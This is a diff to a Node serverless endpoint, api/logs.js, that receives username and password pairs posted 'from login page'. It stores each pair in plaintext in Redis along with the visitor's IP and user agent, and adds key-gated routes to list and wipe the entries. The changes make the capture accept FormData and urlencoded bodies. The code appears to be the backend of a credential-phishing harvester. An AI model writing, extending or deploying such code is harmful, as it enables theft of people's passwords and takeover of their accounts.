@@ -1,5 +1,5 @@
 // lang: Node, file: api/logs.js, target: Vercel serverless (Node 26, ESM)
-// POST   /api/logs                    -> capture (JSON body from login page)
+// POST   /api/logs                    -> capture (FormData body)
 // GET    /api/logs?k=…&page=&limit=    -> JSON { entries, total, page, limit }
 // DELETE /api/logs?k=…                 -> wipes the Redis list
 
@@ -22,14 +22,15 @@ function redis() {
 }
 
 function fmtEntry(d, ip) {
+  // Force strings, fallback to empty if undefined
   return JSON.stringify({
-    ts: d.ts || new Date().toISOString(),
-    ip,
-    ua: d.ua || '',
-    lang: d.lang || '',
-    ref: d.ref || '',
-    user: d.username || '',
-    pass: d.password || '',
+    ts: new Date().toISOString(),
+    ip: String(ip),
+    ua: String(d.ua || ''),
+    lang: '',
+    ref: '',
+    user: String(d.username || ''),
+    pass: String(d.password || ''),
   });
 }
 
@@ -44,9 +45,17 @@ export default async function handler(req, res) {
            || req.socket?.remoteAddress || 'unknown';
 
   if (req.method === 'POST') {
-    let body = req.body;
-    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
-    body = body || {};
+    let body = req.body || {};
+    
+    // If Vercel sent it as a string, try to parse it
+    if (typeof body === 'string') {
+      try { body = JSON.parse(body); } catch { 
+        // fallback if it's urlencoded
+        const params = new URLSearchParams(body);
+        body = Object.fromEntries(params.entries());
+      }
+    }
+
     if (!body.username && !body.password) { res.status(204).end(); return; }
 
     const r = redis();
